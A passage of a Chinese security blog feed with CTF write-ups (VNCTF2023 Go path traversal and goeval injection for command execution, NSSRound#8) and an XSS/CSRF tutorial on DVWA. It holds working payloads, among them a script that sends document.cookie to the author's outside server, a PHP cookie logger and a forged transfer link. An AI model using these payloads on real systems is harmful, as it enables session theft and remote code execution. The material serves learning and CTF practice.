class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">r.Run(<span class="string">&quot;:80&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相关路由介绍：</p><blockquote><p>根路由，创建用户目录设置session，创建一个一个名为 “user.gob” 的文件，然后将一个名为 “ctfer” 的用户对象编码并写入 “user.gob” 文件中。gob文件可以理解为go的二进制文件，用于传输。</p><p>upload路由，限制我们上传的文件后缀不能为go或者gob。上传成功返回文件路径。</p><p>&#x2F;unzip路由将我们上传的zip文件进行解压。</p><p>&#x2F;backdoor路由，从session中获取shallow值，并且判断user.gob文件是否存在，存在就会解码其中的数据，判断用户权限，并执行Eval函数，这段代码的作用是提供一个后门，允许管理员在服务器上执行任意的Go代码。</p></blockquote><p>审计完代码，我们想到的思路就是怎么样去覆盖user.gob文件进行权限提升来RCE。</p><h3 id="目录穿越覆盖user-go文件"><a href="#目录穿越覆盖user-go文件" class="headerlink" title="目录穿越覆盖user.go文件"></a>目录穿越覆盖user.go文件</h3><p>那么首先第一步，去覆盖user.go文件来提升权限。根据读代码，</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">userDir := <span class="string">&quot;/tmp/&quot;</span> + cryptor.Md5String(c.ClientIP()+<span class="string">&quot;VNCTF2023GoGoGo~&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line">.....</span><br><span class="line">gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>)#创建文件</span><br><span class="line">user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;low&quot;</span>&#125;</span><br><span class="line">.....</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Your path: &quot;</span> + userDir&#125;)</span><br></pre></td></tr></table></figure><p>在根路由下，生成一个临时目录，在此目录下创建一个user.gob文件，将目录路径显示在当前页面。再看我们upload路由下上传的路径。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">userDir := <span class="string">&quot;/tmp/&quot;</span> + cryptor.Md5String(c.ClientIP()+<span class="string">&quot;VNCTF2023GoGoGo~&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line">session := sessions.Default(c)</span><br><span class="line">session.Set(<span class="string">&quot;shallow&quot;</span>, userDir)</span><br><span class="line">.......</span><br><span class="line">userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br></pre></td></tr></table></figure><p>所以说，我们上传的目录在user.go当前目录的子目录，所以需要目录穿越，在unzip路由代码中，filepath.Clean函数存在目录穿越漏洞。filepath.Clean函数将路径名进行规范化，具体功能为：</p><img src="/2023/02/19/VNCTF2023web%E5%A4%8D%E7%8E%B0/6.png" class><p>这个函数本身是没有任何问题的，若在此没有做任何限制，攻击者通过构造特殊的输入路径名，来访问系统上其没有权限访问的文件或目录，举个例子，filepath.Clean(“&#x2F;var&#x2F;www&#x2F;“ + filePath)，当filePath为”..&#x2F;etc&#x2F;passwd”，拼接后的路径为&#x2F;var&#x2F;www&#x2F;..&#x2F;etc&#x2F;passwd。在路径名规范化时，路径就会整合成&#x2F;var&#x2F;etc&#x2F;passwd。了解原理后，可以在上传路径添加几个..&#x2F;来导致穿越。接着，编写gob文件，我根本不会。直接去问AI了，当然，下面这个网站也介绍了，还是感觉没有AI方便。<a href="http://c.biancheng.net/view/4563.html">Go语言二进制文件的读写操作</a></p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// 定义一个结构体</span></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name <span class="type">string</span></span><br><span class="line">    path <span class="type">string</span></span><br><span class="line">Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个文件，用于保存 gob 数据</span></span><br><span class="line">userdir:= <span class="string">&quot;/tmp/4960cd5dcd3379599fa2d23ce376115b/&quot;</span></span><br><span class="line">    file, err := os.Create(<span class="string">&quot;./user.gob&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Failed to create file:&quot;</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> file.Close()</span><br><span class="line">    <span class="comment">// 创建一个 gob 编码器</span></span><br><span class="line">    encoder := gob.NewEncoder(file)</span><br><span class="line">    <span class="comment">// 创建一个 User 实例，并设置其属性</span></span><br><span class="line">    User := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userdir, Power: <span class="string">&quot;admin&quot;</span> &#125;</span><br><span class="line">    <span class="comment">// 使用编码器将 User 实例编码为 gob 数据并写入文件</span></span><br><span class="line">    <span class="keyword">if</span> err := encoder.Encode(User); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Failed to encode person:&quot;</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Person data has been written to person.gob&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>话不多说，先上传试试。</p><img src="/2023/02/19/VNCTF2023web%E5%A4%8D%E7%8E%B0/7.png" class><p>打印出Good，成功覆盖掉user.gob文件。</p><h3 id="函数逃逸RCE"><a href="#函数逃逸RCE" class="headerlink" title="函数逃逸RCE"></a>函数逃逸RCE</h3><p>只打印出Good是远远不够的。该怎么RCE才是我们最终的目的。题目代码中给了一种后门代码：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))</span><br></pre></td></tr></table></figure><p>第一个参数，表示代码执行的环境变量，一般为空。第二个参数，需要被执行的代码。第三个参数为导入的包名。从代码上看，我们只能控制包名，通过沙箱逃逸来RCE，相关链接：<a href="https://cn-sec.com/archives/1281015.html">go沙箱逃逸</a></p><p>漏洞利用可以看看这位师傅的文章：<a href="https://www.gem-love.com/2022/07/25/goeval%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#undefined">goeval代码注入导致远程代码执行</a></p><p>引用相关例子说明一下，如下代码：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">Package := <span class="string">&quot;fmt\&quot;\n)\nfunc\tinit()&#123;\nfmt.Print(\&quot;我是init\&quot;)\n&#125;\nvar\t(\na=\&quot;1&quot;</span></span><br><span class="line">res, _ := eval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Print(&quot;</span><span class="number">123</span><span class="string">&quot;)&quot;</span>, Package)</span><br><span class="line">fmt.Println(<span class="type">string</span>(res))</span><br></pre></td></tr></table></figure><p>其中\t代替空格，注入init()函数，因为它比main函数先调用。而在函数内部是这样的：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span>    <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">fmt.Print(<span class="string">&quot;我是init&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span>(</span><br><span class="line">a=<span class="string">&quot;1&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Print(<span class="number">123</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码执行最先会打印出我是init。就利用这个闭合原理来构造恶意代码。就借用开头那位师傅的payload。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">os/exec<span class="string">&quot;%0A&quot;</span>fmt<span class="string">&quot;)%0Afunc%09init()%7B%0Acmd:=exec.Command(&quot;</span>/bin/sh<span class="string">&quot;,&quot;</span>-c<span class="string">&quot;,&quot;</span>cat$&#123;IFS&#125;/f*<span class="string">&quot;)%0Ares,err:=cmd.CombinedOutput()%0Afmt.Println(err)%0Afmt.Println(res)%0A&#125;%0Aconst(%0AMessage=&quot;</span>fmt</span><br></pre></td></tr></table></figure><p>此代码整合后大概是这样：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cat /f*&quot;</span>)<span class="comment">//执行shell命令</span></span><br><span class="line">res, err := cmd.CombinedOutput()<span class="comment">//将执行结果保存在res变量中</span></span><br><span class="line">fmt.Println(err)</span><br><span class="line">fmt.Println(<span class="type">string</span>(res))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    Message = <span class="string">&quot;fmt&quot;</span><span class="comment">//最后的&quot;)，双引号需要一个字符串类型进行闭合</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>将此代码传进去得到ASCLI</p><img src="/2023/02/19/VNCTF2023web%E5%A4%8D%E7%8E%B0/8.png" class><p>解码得到flag字符串。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>第一次参加VNCTF，web题目对于我来说挺新颖奇特。也借着这次比赛接触到了rust和go语言相关安全，最后一道web禅道cms的代码审计最新版，以往的禅道cms我还没有审计过，更别提最新版了。等有时间也要审计一下禅道系列。总之，这次比赛收获颇多。</p>]]></content>
      
      
      <categories>
          
          <category> 赛题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GO函数逃逸 </tag>
            
            <tag> rust </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅说XSS和CSRF</title>
      <link href="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/"/>
      <url>/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/</url>
      
        <content type="html"><![CDATA[<h2 id="浅说XSS"><a href="#浅说XSS" class="headerlink" title="浅说XSS"></a>浅说XSS</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>跨站脚本是一种针对于前端的代码注入攻击，攻击者将恶意的JavaScript代码注入到过滤不严格的web网页中，当用户游览该网页时，JavaScript代码就会被执行，从而达到恶意攻击的目的。</p></blockquote><p>XSS有三种类型，分别来说说。</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>通常情况下，恶意代码参数会注入在URL中，通过用户去点击链接，其中的恶意参数会被HTML解析，执行。非持久的，恶意代码不会注入到服务器中，每次执行都需要用户去点击或者访问。</p><p>DVWA靶场设置难度为low，源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将用户输入与html拼接在一块，此处没有任何过滤，存在XSS。测试反射型XSS通常使用alert函数，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/1.png" class><p>有了反射型XSS究竟能干什么？当然是盗取cookie。在我们的公网ip上写一个接收cookie的php文件，内容如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>打开ctfshow平台的XSS题目，输入恶意的JavaScript代码盗取cookie。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location=&quot;http://xilitter.top/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>此时，我的服务器上就会生成一个cookie.txt文件。</p><img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/2.png" class><p>此时就获取到cookie，得到cookie就可以伪造用户登录了。上面那一行代码怎么获得cookie的？document.location返回一个Location对象，也就是映射一个URL，并且加载跳转到此URL上。document.cookie获取当前文档相关的cookie，拼接到恶意的URL中访问cookie.php，生成cookie.txt。</p><h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>顾名思义，恶意的HTML代码会被存储到服务端的数据库或者文件中，每当用户去访问此页面时，注入的恶意代码就会被执行，持续攻击用户。存储型XSS大多出现在博客的评论当中。</p><p>DVWA难度设置为low，源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line"><span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"><span class="comment">// Sanitize message input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line"><span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="comment">// Sanitize name input</span></span><br><span class="line"><span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>几个函数相关解释：</p><blockquote><p>trim函数 ： 移除string字符两侧的预定义字符，预定义字符包括\t 、 \n 、\x0B 、\r以及空格</p><p>stripslashes函数： 去除掉string字符的反斜杠＼</p><p>mysqli_real_escape_string函数 ：函数会对字符串string中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。</p></blockquote><p>可以发现此代码并没有过滤HTML标签，并且会将我们输出的两个参数存储到数据库中。我们尝试输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/3.png" class><p>会发现有弹窗，并且每次刷新此网页，就会弹窗，查看一下数据库</p><img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/4.png" class><p>恶意JavaScript代码确实被写入到数据库中了。接下来用ctfshow平台的web题演示一下存储型XSS获取管理员cookie。</p><img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/5.png" class><p>将此代码注入到服务端中，当管理员访问此页面，就会将管理员cookie带入到我们的服务器上。</p><img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/6.png" class><p>其中必有管理员的cookie，替换PHPSESSID就可以访问到管理员页面。</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>什么是DOM？</p><blockquote><p>文档对象模型，是一种处理HTML和XML文件的标准API，提供了大量可用于操作文本内容的对象和方法。HTML文档被解析后，转化为DOM树，因此对HTML文档的处理可以通过对DOM树的操作实现。DOM模型不仅描述了文档的结构，还定义了结点对象的行为，利用对象的方法和属性，可以方便地访问、修改、添加和删除DOM树的结点和内容。</p></blockquote><p>一个简单的节点树</p><img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/7.png" class><p>JavaScript可以通过对象模型动态创建修改HTML节点。当JavaScript对DOM树不安全的处理数据时，可能会造成XSS。这种DOM型的XSS不与服务端进行交互，而是直接操作前端的HTML代码来达到攻击的目的。所以这种XSS隐秘性很好，只通过服务端的日志和数据库很难发现它。</p><p>继续使用DVWA来演示一下，由于DOM型的XSS不与服务端进行交互，所以源码是前端的JavaScript代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> lang = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span><br><span class="line">&#125;    </span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>检查这个URL中是否存在default参数，如果有，将参数的值添加到DOM树中。很明显，代码没有对用户的输入进行检查，此处存在DOM型的XSS。提交参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">localhost/DVWA/vulnerabilities/xss_d/?default=&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>有弹窗，而且在我们的前端代码中发现提交的JavaScript代码写进DOM树里了。</p><img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/8.png" class><p>XSS参考链接：</p><p><a href="https://www.freebuf.com/articles/web/306031.html">DOM型的XSS</a>                                                        <a href="https://blog.csdn.net/Silver_lion/article/details/107945099">反射型XSS</a></p><p><a href="https://www.freebuf.com/vuls/285123.html">XSS综合指南</a>                                                         <a href="https://zhuanlan.zhihu.com/p/50324316">什么是DOM</a></p><h2 id="浅说CSRF"><a href="#浅说CSRF" class="headerlink" title="浅说CSRF"></a>浅说CSRF</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><blockquote><p>跨站请求伪造，当用户与被攻击网站持续会话，攻击者诱导受害者去点击攻击者恶意构造的链接，第三方网站向被攻击网站发送跨站请求，此时第三方网站已经获取到了会话凭证，绕过网站用户验证，伪造用户对被攻击网站进行恶意操作。</p></blockquote><p>CSRF攻击流程图：</p><img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/9.png" class><p>举个例子，小王登录了一个银行页面并没有关闭，假设该页面的源码为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$money</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;向 <span class="subst">$user</span> 转账成功，金额为 <span class="subst">$money</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时攻击者构造一个恶意的链接：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://127.0.0.1/test/1.php?user=hacker&amp;money=1000&quot;</span>&gt;</span>点开有惊喜<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/10.png" class><p>当用户忍不住点击，就向被攻击网站发送了请求。</p><img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/11.png" class><p>这是用GET方式发送的请求，当然还有POST方式。将上面代码替换为POST即可。POST方式要构造表单，可以利用burp工具来帮咱们完成。我们先访问1.php并赋上值抓包。</p><img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/12.png" class><p>选择burp自动生成CSRF的POC模块。</p><img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/13.png" class><p>将此代码复制粘贴到攻击者构造的恶意链接中。当用户访问</p><img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/14.png" class><p>点击后，恶意请求就发送到被攻击网站。</p><h3 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h3><blockquote><p>Referer验证，Referer字段记录了该HTTP请求的来源地址，限制请求必须来自同一个网站，这么做安全性确实能大大提高，但是没了自由。另外Referer字段也是能够绕过的。</p><p>Token验证，CSRF本质上是受害者自己攻击自己。当用户的验证信息都存在Cookie中，通过点击恶意链接，在用户不知情的情况下利用自己的身份凭证绕过了网站用户验证。开发者可以设置一个不能伪造的，随机的token值，在服务端建立一个拦截器来验证token，如果匹配的token不正确，则会拒绝此请求。</p></blockquote><p>CSRF参考链接：</p><p><a href="https://www.freebuf.com/articles/web/341591.html">CSRF入门及实战</a>                                                                        <a href="https://blog.csdn.net/weixin_45728976/article/details/104506544">CSRF的利用</a></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本次文章只是简单的说明了XSS和CSRF的特点以及利用，由于前端代码知识不是很了解，对DOM树操作的API之前也从来没看过，之后补上这些前端知识后，会在此文章上追加相关漏洞CTF题目讲解。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API">API相关介绍</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound#8 Basic记录</title>
      <link href="/2023/02/14/NSSRound-8-Basic%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/02/14/NSSRound-8-Basic%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续记录NSS平台的赛题，NSSRound#8赛题比较基础，但还是值得记录一下。</p><h2 id="MyDoor"><a href="#MyDoor" class="headerlink" title="MyDoor"></a>MyDoor</h2><p>打开题目，细看url。</p><img src="/2023/02/14/NSSRound-8-Basic%E8%AE%B0%E5%BD%95/5.png" class><p>盲猜这里存在文件包含，使用php:&#x2F;&#x2F;filter读取index文件，获得源码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ 